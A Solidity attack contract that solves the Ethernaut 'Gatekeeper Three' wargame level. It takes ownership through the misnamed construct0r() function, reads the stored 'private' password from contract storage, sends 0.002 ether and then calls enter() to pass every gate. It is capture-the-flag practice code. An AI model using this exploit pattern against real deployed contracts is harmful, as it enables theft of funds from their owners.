// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external returns (bool entered);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public ethernautInstance;

    constructor(address instanceAddress) payable {
        ethernautInstance = IGatekeeperThree(instanceAddress);
        ethernautInstance.createTrick();
    }

    // Find the password using ethers library getStorageAt in your attacker script.
    function attack(uint password) public {
        // Become the owner of the instance.
        ethernautInstance.construct0r();

        // Call the getAllowance function with the password value stored in the SimpleTrick
        ethernautInstance.getAllowance(password);

        // Send 0.002 ether to the instance
        (bool s, ) = address(ethernautInstance).call{value: 0.002 ether}("");
        require(s);

        // After passing all the gates, call the enter function.
        ethernautInstance.enter();
    }
}